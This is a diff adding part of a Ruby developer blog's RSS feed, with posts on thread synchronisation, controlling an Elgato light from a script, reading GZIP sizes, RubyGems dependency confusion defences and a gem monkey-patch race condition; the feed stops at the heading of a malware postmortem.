+</p>
+<p>Assuming an endless stream of data available, this can be pretty much modelled as followed:</p>
+<pre><code class="language-ruby">queue = Queue.new
+
+THREADS = 10
+
+THREADS.times do |i|
+  Thread.new do
+    loop do
+      data, task = queue.pop
+      task.call(data)
+    end
+  end
+end
+
+def wait_for_jobs_to_finish(queue)
+  Thread.pass while queue.num_waiting &lt; THREADS || !queue.empty?
+end
+
+def data
+  Array.new(10) { rand }
+end
+
+task = -&gt;(data) { data * 2 }
+
+100_000.times do
+  data.each { queue &lt;&lt; [_1, task] }
+
+  wait_for_jobs_to_finish(queue)
+end</code></pre>
+<p>And this is how the listener loop together with jobs distributions was implemented by me initially.</p>
+<p>When benchmarked in regards to the number of times <code>Thread#pass</code> was executed on a pass-through benchmark (where we measure max throughput), things looked solid.</p>
+<p>Despite increased number of iterations, we would not wait more often per iteration. What that means, is that our jobs were short enough for them to finish prior to Ruby returning to the wait loop.</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-12-59-06.png" alt="" width="596" height="364" class="aligncenter size-full wp-image-5366" srcset="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-12-59-06.png 596w, https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-12-59-06-300x183.png 300w" sizes="(max-width: 596px) 100vw, 596px" /></p>
+<p>Things become much more interesting if we assume that our jobs take more time than Ruby gives them before thread execution is interrupted. Then things start to look differently:</p>
+<pre><code class="language-ruby"># Same code as before but the job has a bit of sleep simulating IO
+task = -&gt;(data) { sleep(rand(9..11) / 10000.0) }</code></pre>
+<p>Assuming we burn around 1ms per job, the number of passes skyrockets:</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-13-17-40.png" alt="" width="592" height="365" class="aligncenter size-full wp-image-5369" srcset="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-13-17-40.png 592w, https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-13-17-40-300x185.png 300w" sizes="(max-width: 592px) 100vw, 592px" /></p>
+<p>That's over <strong>1000</strong> times more invocations of the same method!</p>
+<p>In a case, where we would run heavy queries of around 100ms (+/- 10%) per job, we end up with following results per iteration:</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-14-03-11.png" alt="" width="591" height="363" class="aligncenter size-full wp-image-5377" srcset="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-14-03-11.png 591w, https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-14-03-11-300x184.png 300w" sizes="(max-width: 591px) 100vw, 591px" /></p>
+<p>That means, that Ruby had to run <code>#Thread#pass</code> over <strong>180 000</strong> times on average for nothing!</p>
+<p>When optimizing any code, it is good to establish the primary use case for its usage. In the case of Karafka, while raw throughput is important, it is more about complex jobs being able to use the GVL release strategy to allow parallel work execution upon IO.</p>
+<p>So, is there a better way to make Ruby wait patiently on all the jobs to be done? There is: <code>Queue#pop.</code> Since it is thread-safe, we can use it to notify the main thread that the given job has finished. It won't eliminate useless runs, but it will reduce them so much that they, in fact, will become insignificant. Since we know how many jobs we've enqueued, we know how many times we need to <code>#pop</code>:</p>
+<pre><code class="language-ruby">queue = Queue.new
+lock = Queue.new
+
+THREADS = 10
+
+THREADS.times do |i|
+  Thread.new do
+    loop do
+      data, task = queue.pop
+      task.call(data)
+      lock &lt;&lt; true
+    end
+  end
+end
+
+def wait_for_jobs_to_finish(dispatched, lock)
+  dispatched.times { lock.pop }
+end
+
+def data
+  Array.new(10) { rand }
+end
+
+task = -&gt;(data) { data * 2 }
+
+100_000.times do
+  data.each { queue &lt;&lt; [_1, task] }
+
+  wait_for_jobs_to_finish(data.size, lock)
+end</code></pre>
+<p>The <code>lock.pop</code> will stop the execution of the main thread until each job is done. This means that we increase the number of stops with an increased number of threads. However, this correlation is linear and the end result is orders of magnitude smaller than when using <code>Thread.pass</code>.</p>
+<p>Here's the same benchmark with a number of <code>Queue#pop</code> calls that replaced <code>Thread#pass</code> for non-sleep case:</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-14-58-47.png" alt="" width="592" height="365" class="aligncenter size-full wp-image-5383" srcset="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-14-58-47.png 592w, https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-14-58-47-300x185.png 300w" sizes="(max-width: 592px) 100vw, 592px" /></p>
+<p>The number of <code>Queue#pop</code> invocations equals the thread number. It is <strong>independent</strong> of jobs types or any other circumstances. So the longer jobs are, the bigger the improvement:</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-15-06-16.png" alt="" width="594" height="364" class="aligncenter size-full wp-image-5385" srcset="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-15-06-16.png 594w, https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-15-06-16-300x184.png 300w" sizes="(max-width: 594px) 100vw, 594px" /></p>
+<p>This change not only reduced the number of calls by over <strong>99.994%</strong> but it also drastically lowered CPU utilization, which is visible especially for cases with extensive IO (here simulated with sleep):</p>
+<p><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-16-21-40.png" alt="" width="604" height="507" class="aligncenter size-full wp-image-5387" srcset="https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-16-21-40.png 604w, https://mensfeld.pl/wp-content/uploads/2022/01/Zrzut-ekranu-z-2022-01-19-16-21-40-300x252.png 300w" sizes="(max-width: 604px) 100vw, 604px" /></p>
+<h2>Summary</h2>
+<p>So, is one better than the other? <strong>No</strong>. They should be used in different cases and to achieve different goals.</p>
+<p><code>Thread#pass</code> should not be used to defer work but rather to provide a hint to Ruby, that there may be more important things that it could focus on.</p>
+<p><code>Queue#pop</code> on the other hand can act not only as a component of a queue but also as a part of multi-threaded applications flow control.</p>
+<p>Concurrency is not easy. Thread management and selection of proper methods are as crucial as understanding your primary use-cases and building correct benchmarks. Sometimes minor tweaks can provide tremendous benefits.</p>
+<hr/>
+<p><strong>Note</strong>: this post would not be possible without extensive help from <a href="https://www.codeotaku.com/index">Samuel Williams</a>. Thank you!</p>
+<hr/>
+<p>Cover photo by <a href="https://www.flickr.com/photos/chberge/3803475294/">Chris-Håvard Berge</a> on Attribution-NonCommercial 2.0 Generic (CC BY-NC 2.0) . Image has been cropped.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2022/01/reduce-your-method-calls-by-99-9-by-replacing-threadpass-with-queuepop/">Reduce your method calls by 99.9% by replacing Thread#pass with Queue#pop</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2022/01/reduce-your-method-calls-by-99-9-by-replacing-threadpass-with-queuepop/feed/</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Controlling Elgato Key Light under Ubuntu with Ruby</title>
+		<link>https://mensfeld.pl/2021/12/controlling-elgato-key-light-under-ubuntu-with-ruby/</link>
+					<comments>https://mensfeld.pl/2021/12/controlling-elgato-key-light-under-ubuntu-with-ruby/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Tue, 28 Dec 2021 16:58:18 +0000</pubDate>
+				<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Snippets]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[elgato]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=5307</guid>
+
+					<description><![CDATA[<p>Recently I've acquired Elgato Key Light. It is a WiFi controllable LED lighting panel. The panel uses 160 LEDs to provide up to 2800 lumens of brightness and a color range of 2900-7000K. While you can control it from a mobile device, doing it directly from the shell makes the whole experience way more convenient. [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2021/12/controlling-elgato-key-light-under-ubuntu-with-ruby/">Controlling Elgato Key Light under Ubuntu with Ruby</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>Recently I've acquired Elgato Key Light. It is a WiFi controllable LED lighting panel.</p>
+<p>The panel uses 160 LEDs to provide up to 2800 lumens of brightness and a color range of 2900-7000K. While you can control it from a mobile device, doing it directly from the shell makes the whole experience way more convenient.</p>
+<p>Key Light officially does not support Linux, however it uses ESP32, and it does run an unprotected HTTP server that accepts JSON commands. You can not only turn it on and off but also adjust both light temperature and brightness with simple JSON requests.</p>
+<p>Here's the code that I use to control my lights written in Ruby:</p>
+<pre class="brush: ruby; title: ; notranslate">
+#!/usr/bin/env ruby
+
+require 'uri'
+require 'net/http'
+require 'json'
+require 'yaml'
+
+# Set your lights IPs
+LIGHTS = %w[
+  192.168.0.199
+]
+
+COMMAND = ARGV[0]
+DETAIL1 = ARGV[1].to_i
+DETAIL2 = ARGV[2].to_i
+
+# Sends a json request to a given elgato light
+def dispatch(ip, payload, endpoint, method)
+  uri = URI(&quot;http://#{ip}:9123/elgato/#{endpoint}&quot;)
+  req = method.new(uri)
+  req.body = payload.to_json
+
+  res = Net::HTTP.start(uri.hostname, uri.port) do |http|
+    http.request(req)
+  end
+
+  puts res.body
+end
+
+def on(light_ip)
+  dispatch(
+    light_ip,
+    { 'numberOfLights': 1, 'lights': [{ 'on': 1 }] },
+    'lights',
+    Net::HTTP::Put
+  )
+end
+
+def off(light_ip)
+  dispatch(
+    light_ip,
+    { 'numberOfLights': 1, 'lights': [{ 'on': 0 }] },
+    'lights',
+    Net::HTTP::Put
+  )
+end
+
+def temperature(light_ip, value)
+  raise &quot;Needs to be between 143 and 344, was: #{value}&quot; if value &lt; 143 || value &gt; 344
+
+  dispatch(
+    light_ip,
+    { 'numberOfLights': 1, 'lights': [{ 'on': 1, 'temperature': value }] },
+    'lights',
+    Net::HTTP::Put
+  )
+end
+
+def brightness(light_ip, value)
+  raise &quot;Needs to be between 3 and 100, was: #{value}&quot;  if value &lt; 3 || value &gt; 100
+
+  dispatch(
+    light_ip,
+    { 'numberOfLights': 1, 'lights': [{ 'on': 1, 'brightness': value }] },
+    'lights',
+    Net::HTTP::Put
+  )
+end
+
+def info(light_ip)
+  dispatch(
+    light_ip,
+    {},
+    'accessory-info',
+    Net::HTTP::Get
+  )
+end
+
+def command(command, light_ip)
+  case command
+  when 'on'
+    on(light_ip)
+  when 'off'
+    off(light_ip)
+  when 'temperature'
+    temperature(light_ip, DETAIL1)
+  when 'brightness'
+    brightness(light_ip, DETAIL1)
+  when 'theme'
+    temperature(light_ip, DETAIL1)
+    brightness(light_ip, DETAIL2)
+  when 'info'
+    info(light_ip)
+  else
+    raise &quot;Unknown COMMAND #{COMMAND}&quot;
+  end
+end
+
+LIGHTS.each { |light_ip| puts command(COMMAND, light_ip) }
+</pre>
+<p>You can place this code in <code>/usr/local/bin</code> under <code>elgato</code> name with executable permissions and then you can just:</p>
+<pre class="brush: bash; title: ; notranslate">
+elgato on # turn your lights on
+elgato off # turn your lights off
+elgato info # get info on your lights
+elgato brightness 50 # set brightness to 50%
+elgato temperature 280 # make  light temperature quite warm
+</pre>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2021/12/controlling-elgato-key-light-under-ubuntu-with-ruby/">Controlling Elgato Key Light under Ubuntu with Ruby</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2021/12/controlling-elgato-key-light-under-ubuntu-with-ruby/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Reading the uncompressed GZIP file size in Ruby without decompression</title>
+		<link>https://mensfeld.pl/2021/11/reading-the-uncompressed-gzip-file-size-in-ruby-without-decompression/</link>
+					<comments>https://mensfeld.pl/2021/11/reading-the-uncompressed-gzip-file-size-in-ruby-without-decompression/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Sat, 20 Nov 2021 08:33:36 +0000</pubDate>
+				<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[gzip]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=5290</guid>
+
+					<description><![CDATA[<p>There are cases where you have a compressed GZIP file for which you want to determine the uncompressed data size without having to extract it. For example, if you work with large text-based documents, you can either display their content directly in the browser or share it as a file upon request depending on the [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2021/11/reading-the-uncompressed-gzip-file-size-in-ruby-without-decompression/">Reading the uncompressed GZIP file size in Ruby without decompression</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p>There are cases where you have a compressed GZIP file for which you want to determine the uncompressed data size without having to extract it.</p>
+<p>For example, if you work with large text-based documents, you can either display their content directly in the browser or share it as a file upon request depending on the file size. </p>
+<p>Luckily for us, the <a href="https://www.ietf.org/rfc/rfc1952.txt">GZIP file format specification</a> includes the following statement:</p>
+<pre class="brush: bash; title: ; notranslate">
+         +=======================+
+         |...compressed blocks...| (more--&gt;)
+         +=======================+
+
+           0   1   2   3   4   5   6   7
+         +---+---+---+---+---+---+---+---+
+         |     CRC32     |     ISIZE     |
+         +---+---+---+---+---+---+---+---+
+
+         ISIZE (Input SIZE)
+            This contains the size of the original (uncompressed) input
+            data modulo 2^32.
+</pre>
+<p>It means that as long as the uncompressed payload is less than 4GB, the ISIZE value will represent the uncompressed data size.</p>
+<p>You can get it in Ruby by combining <code>#seek</code>, <code>#read</code> and <code>#unpack1</code> as followed:</p>
+<pre class="brush: ruby; title: ; notranslate">
+# Open file for reading
+file = File.open('data.gzip')
+# Move to the end to obtain only the ISIZE data
+file.seek(-4, 2)
+# Read the needed data and decode it to unsigned int
+size = file.read(4).unpack1('I')
+# Close the file after reading
+file.close
+# Print the result
+puts &quot;Your uncompressed data size: #{size} bytes&quot;
+</pre>
+<hr/>
+<p>Cover photo by <a href="https://www.flickr.com/photos/danielygo" rel="nofollow">Daniel Go</a> on Attribution-NonCommercial 2.0 Generic (CC BY-NC 2.0). Image has been cropped to 766x450px.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2021/11/reading-the-uncompressed-gzip-file-size-in-ruby-without-decompression/">Reading the uncompressed GZIP file size in Ruby without decompression</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2021/11/reading-the-uncompressed-gzip-file-size-in-ruby-without-decompression/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>RubyGems dependency confusion attack side of things</title>
+		<link>https://mensfeld.pl/2021/02/rubygems-dependency-confusion-attack-side-of-things/</link>
+					<comments>https://mensfeld.pl/2021/02/rubygems-dependency-confusion-attack-side-of-things/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Mon, 15 Feb 2021 14:15:22 +0000</pubDate>
+				<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[Bundler]]></category>
+		<category><![CDATA[diffend]]></category>
+		<category><![CDATA[rubygems]]></category>
+		<category><![CDATA[security]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=5231</guid>
+
+					<description><![CDATA[<p>Note: This article is not to deprecate any of the findings and achievements of Alex Birsan. He did great work exploiting specific vulnerabilities and patterns. It is to present the RubyGems side of the story and to reassure you. We actively work to provide a healthy and safe ecosystem for our users. After reading the [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2021/02/rubygems-dependency-confusion-attack-side-of-things/">RubyGems dependency confusion attack side of things</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<p><strong>Note:</strong> This article is <strong>not</strong> to deprecate any of the findings and achievements of <a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">Alex Birsan</a>. He did great work exploiting specific vulnerabilities and patterns. It is to present the RubyGems side of the story and to reassure you. We actively work to provide a healthy and safe ecosystem for our users.</p>
+<p>After reading the <a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610">Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Other Companies</a> I felt, that the Ruby community requires a bit of explanation from people involved in RubyGems security assessment. So here it is.</p>
+<h3>It's you who is responsible for the security of your software, and bugs do exist</h3>
+<p>First of all, let me remind you that your system security should never rely solely on other people's OSS work. In the end, it will be your system that will get hacked. Secondly, any software has bugs, whether we're talking about Bundler, RubyGems, Yarn, or any other piece of code.</p>
+<p>Looking at this incident as someone heavily involved with making the Ruby ecosystem secure, RubyGems did everything right.</p>
+<h3>Does RubyGems allow for malicious packages?</h3>
+<p>Starting from September 2020, Alex has uploaded gems used for his research. <a href="https://diffend.io/">Diffend</a> spotted them, and each of the findings was reported to the RubyGems security team.</p>
+<p>RubyGems security team assessed each of them, going through the source codes to ensure they were not malicious. And they were <strong>not</strong>. The reason why they were allowed to stay is that:</p>
+<ol>
+<li>A security researcher uploaded them that we knew of.</li>
+<li>They included a description and reasoning why they do what they do (see <a href="https://my.diffend.io/gems/valis/2300.4.2#d2h-102270-152">here</a>).</li>
+<li>Several people from RubyGems checked them to ensure they were not doing any harm.</li>
+</ol>
+<p>RubyGems policy regarding gems is simple:</p>
+<blockquote><p>As long as the gem is not doing any harm or is not misleading in a harmful way, it won't be removed.</p></blockquote>
+<p>Thousands of gems download things upon being installed, run compilers, and send requests over the internet. For some advanced cases, there is no other way.</p>
+<h3>It is a constant race</h3>
+<p>We inspect gems and take many countermeasures to ensure the whole ecosystem's safety. While we cannot promise you that we will catch every single attack ever, we are making progress, and we are getting better and better with our detection systems.</p>
+<p>Even the day I'm writing this article, we've yanked (removed) <strong>8</strong> gems that were a build-up for a more significant scale attack.</p>
+<h3>It is not about RubyGems only but also about Bundler</h3>
+<p>Bundler is a complex piece of code. The resolving engine needs to deal with many corner-cases. Security of resolution is the most important thing, but other factors like correctness and speed are also important.</p>
+<p>While we do not know the exact way of installing those gems, our gut feeling is that they might have been resolved "incorrectly". "Incorrectly," however, indicates that they were resolved in an invalid way. At the same time, it may turn out that they were resolved exactly as expected but not as the end-user/programmer wanted. It might be, that it was due to <a href="https://github.com/rubygems/rubygems/issues/3982">this</a> bug. That is, "dependency of my dependency will be checked in RubyGems."</p>
+<h3>I use private gems, please help!</h3>
+<p>If you use private gems with private dependencies, you can do few things at the moment:</p>
+<ol>
+<li><strong>Most important</strong>: Update Bundler once the patch is released.</li>
+<li><del datetime="2021-02-15T17:56:58+00:00"><strong>Most important</strong>: Update Bundler to the <a href="https://rubygems.org/gems/bundler/versions/2.2.10">2.2.10 version</a>.</del></li>
+<li>Always use Bundler <a href="https://bundler.io/gemfile.html#gemfiles">source blocks</a> to ensure that private gems can only come from private sources. If your private gems depend on other private gems, you may need to declare those gems in the private source block as well.</li>
+<li>Setup a tool like <a href="http://diffend.io/">Diffend</a> and create rules that will block Bundler from using RubyGems as a source for gems that match your internal gems naming conventions.</li>
+<li>Mirror RubyGems and upstream only gems you are interested in + your own.</li>
+<li>[workaround] Book the gems names in RubyGems (althought this may also be a potential insight for hackers into internal naming conventions of your company).</li>
+</ol>
+<h3>Summary</h3>
+<p>So yes, there was a bug in Bundler (fixed in 2.2.10), but at the same time, if it was not for explicit permission from the RubyGems security team, those gems would have been yanked soon after they were released. That's why in this particular case, I would rather say that those companies got "researched" rather than hacked.</p>
+<p>This incident made RubyGems reconsider the "no harm" policy, and it may be subject to change in the near future.</p>
+<hr />
+<p>Cover photo by <a href="https://www.flickr.com/photos/141464170@N04/" rel="nofollow">Jan Hrdina</a> on Attribution-ShareAlike 2.0 Generic (CC BY-SA 2.0).</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2021/02/rubygems-dependency-confusion-attack-side-of-things/">RubyGems dependency confusion attack side of things</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2021/02/rubygems-dependency-confusion-attack-side-of-things/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>How requiring a gem can mess up your already running application</title>
+		<link>https://mensfeld.pl/2021/01/how-requiring-a-gem-can-mess-up-your-already-running-application/</link>
+					<comments>https://mensfeld.pl/2021/01/how-requiring-a-gem-can-mess-up-your-already-running-application/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Sat, 23 Jan 2021 19:37:24 +0000</pubDate>
+				<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[Software]]></category>
+		<category><![CDATA[bug]]></category>
+		<category><![CDATA[whenever]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=5195</guid>
+
+					<description><![CDATA[<p>Introduction Ruby's dynamic nature is both its advantage and disadvantage. Being able to reopen system classes during runtime, while useful, can also lead to unexpected behaviors. This article presents one such case: how just requiring a gem can mess things up in a completely different area of the application. The bizzare error Recently, after connecting [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2021/01/how-requiring-a-gem-can-mess-up-your-already-running-application/">How requiring a gem can mess up your already running application</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[<h3>Introduction</h3>
+<p>Ruby's dynamic nature is both its advantage and disadvantage. Being able to reopen system classes during runtime, while useful, can also lead to unexpected behaviors. This article presents one such case: how just requiring a gem can mess things up in a completely different area of the application.</p>
+<h3>The bizzare error</h3>
+<p>Recently, after connecting the <a href="http://diffend.io/">Diffend</a> monitor into one of my systems, it started reporting a bizarre error:</p>
+<pre class="brush: ruby; title: ; notranslate">
+uninitialized constant Whenever
+
+whenever-1.0.0/lib/whenever/numeric.rb:3:in `respond_to?'
+lib/ruby/2.7.0/bundler/settings.rb:368:in `=='
+lib/ruby/2.7.0/bundler/settings.rb:368:in `=='
+lib/ruby/2.7.0/bundler/settings.rb:368:in `converted_value'
+lib/ruby/2.7.0/bundler/settings.rb:94:in `[]'
+lib/ruby/2.7.0/bundler/fetcher.rb:80:in `'
+lib/ruby/2.7.0/bundler/fetcher.rb:11:in `'
+lib/ruby/2.7.0/bundler/fetcher.rb:9:in `'
+diffend-monitor-0.2.36/lib/diffend/build_bundler_definition.rb:18:in `call'
+diffend-monitor-0.2.36/lib/diffend/execute.rb:22:in `build_definition'
+diffend-monitor-0.2.36/lib/diffend/execute.rb:12:in `call'
+diffend-monitor-0.2.36/lib/diffend/track.rb:21:in `start'
+diffend-monitor-0.2.36/lib/diffend/monitor.rb:42:in `block in '
+</pre>
+<p>the line in which it was happening was just a delegation to the Bundler API method:</p>
+<pre class="brush: ruby; title: ; notranslate">
+::Bundler::Fetcher.disable_endpoint = nil
+</pre>
+<p>and in <a rel="nofollow" href="https://github.com/rubygems/bundler/blob/35be6d9a603084f719fec4f4028c18860def07f6/lib/bundler/fetcher.rb#L77">Bundler</a> itself it is just an <code>attr_accessor</code>:</p>
+<pre class="brush: ruby; title: ; notranslate">
+class &lt;&lt; self
+  attr_accessor :disable_endpoint, :api_timeout, :redirect_limit
+end
+</pre>
+<p>So what does all of it has to do with the Whenever gem? Nothing.</p>
+<p>We have nothing to do with Whenever but it does not mean Whenever has nothing to do with us.</p>
+<p>Requiring a gem does not only mean that its code is being loaded. It also means that the gem can perform any operations it wants, whether legit or <a href="https://mensfeld.pl/2020/12/rubygems-bitcoin-stealing-malware-postmortem/">malicious</a>.</p>
+<p>When <code>diffend-monitor</code> is being required, it spins up its own Ruby thread and starts reporting data. And here is the moment when Whenever kicks in. It was being required after the monitor. Thus the monitor code was already running. In theory, those two should be separated entirely. Whenever and Diffend do entirely different things and they have their own namespaces.</p>
+<p>It turns out, unfortunately, that Whenever is monkey patching <code>Numeric</code> class in an incorrect way:</p>
+<pre class="brush: ruby; title: ; notranslate">
+Numeric.class_eval do
+  def respond_to?(method, include_private = false)
+    super || Whenever::NumericSeconds.public_method_defined?(method)
+  end
+
+  def method_missing(method, *args, &amp;block)
+    if Whenever::NumericSeconds.public_method_defined?(method)
+      Whenever::NumericSeconds.new(self).send(method)
+    else
+      super
+    end
+  end
+end
+</pre>
+<p>This patch seems to be safe, but there's a really big assumption made: <code>Whenever::NumericSeconds</code> needs to be accessible. If we look into the Whenever <a  rel="nofollow" href="https://github.com/javan/whenever/blob/main/lib/whenever.rb#L1">code loading</a> file, we will notice, that the patch is required before <code>Whenever::NumericSeconds</code> comes to existence:</p>
+<pre class="brush: ruby; title: ; notranslate">
+require 'whenever/numeric'
+require 'whenever/numeric_seconds'
+</pre>
+<p>This means that any action that would invoke <code>#method_missing</code> after the first file is loaded, but before the second one, will fail.</p>
+<p>Can it even happen? Absolutely! Ruby's require is <strong>not</strong> blocking. It means, that Ruby VM can stop the requiring after any of the files and switch context to do other things in other threads.</p>
+<p>When the above is understood, building a reproduction code is just a matter of seconds:</p>
+<pre class="brush: ruby; title: ; notranslate">
+Thread.new do
+  while true
+    begin
+      1.respond_to?(:elo)
+      sleep 0.00001
+    rescue =&gt; e
+      p e
+    end
+  end
+end
+
+sleep 0.2
+
+require 'whenever'
+</pre>
+<p>Here's how it behaves when executed:</p>
+<p><a href="https://mensfeld.pl/wp-content/uploads/2021/01/whenever-2.gif" rel="lightbox[5195]"><img decoding="async" loading="lazy" src="https://mensfeld.pl/wp-content/uploads/2021/01/whenever-2.gif" alt="" width="746" height="344" class="aligncenter size-full wp-image-5212" /></a></p>
+<p>I’ve created an <a rel="nofollow" href="https://github.com/javan/whenever/issues/812">issue</a> in Whenever, and hopefully, its maintainers will address it. Meanwhile there's one more question to ask: can we somehow address this problem, so it won't break our code?</p>
+<h3>Mitigating the issue before the library is patched</h3>
+<p>There is no silver bullet for this type of problem. As any gem can introduce their own patches to other classes, the potential problems are endless. In this particular case, the code ends up being “ok” once everything is loaded. What we’ve decided to do was pretty <a href="https://my.diffend.io/gems/diffend-monitor/0.2.38/0.2.39#d2h-171788-1038">trivial</a>. We’ve decided to give the app enough time to require all the things that could potentially break the execution:</p>
+<pre class="brush: ruby; title: ; notranslate">
+Thread.new do
+  sleep 0.5
+
+  while true
+    begin
+      1.respond_to?(:elo)
+      sleep 0.00001
+    rescue =&gt; e
+      p e
+    end
+  end
+end
+</pre>
+<p>This sleep ensures that as long as nothing heavy happens during gems requirement via Bundler, we don't end up with partially loaded, broken monkey-patches while executing our own logic in a background thread.</p>
+<hr/>
+<p>Cover photo by <a href="https://www.flickr.com/photos/bobex_pics/31036323254/" rel="nofollow">Ruin Raider</a> on Attribution-NonCommercial-NoDerivs 2.0 Generic (CC BY-NC-ND 2.0) license.</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2021/01/how-requiring-a-gem-can-mess-up-your-already-running-application/">How requiring a gem can mess up your already running application</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>https://mensfeld.pl/2021/01/how-requiring-a-gem-can-mess-up-your-already-running-application/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>RubyGems Bitcoin Stealing Malware postmortem</title>
+		<link>https://mensfeld.pl/2020/12/rubygems-bitcoin-stealing-malware-postmortem/</link>
+					<comments>https://mensfeld.pl/2020/12/rubygems-bitcoin-stealing-malware-postmortem/#respond</comments>
+		
+		<dc:creator><![CDATA[Maciej Mensfeld]]></dc:creator>
+		<pubDate>Thu, 31 Dec 2020 16:58:33 +0000</pubDate>
+				<category><![CDATA[Ruby]]></category>
+		<category><![CDATA[rubygems]]></category>
+		<category><![CDATA[security]]></category>
+		<guid isPermaLink="false">https://mensfeld.pl/?p=5157</guid>
+
+					<description><![CDATA[<p>Introduction On the 7th and 13th of December, there were two malicious packages uploaded to RubyGems. Here’s the postmortem and analysis of the packages' content. Diffend.io platform that I run closely cooperates with the RubyGems team, providing immediate insights into any gems that have "weird" characteristics. Thanks to that, the gems were yanked relatively fast. [&#8230;]</p>
+<p>The post <a rel="nofollow" href="https://mensfeld.pl/2020/12/rubygems-bitcoin-stealing-malware-postmortem/">RubyGems Bitcoin Stealing Malware postmortem</a> appeared first on <a rel="nofollow" href="https://mensfeld.pl">Closer to Code</a>.</p>
+]]></description>
+										<content:encoded><![CDATA[
+<h3>Introduction</h3>
+<p>On the 7th and 13th of December, there were two malicious packages uploaded to RubyGems. Here’s the postmortem and analysis of the packages' content.</p>
+<p><a href="https://diffend.io/">Diffend.io</a> platform that I run closely cooperates with the RubyGems team, providing immediate insights into any gems that have "weird" characteristics. Thanks to that, the gems were yanked relatively fast.</p>
+<h3>ruby-bitcoin postmortem</h3>
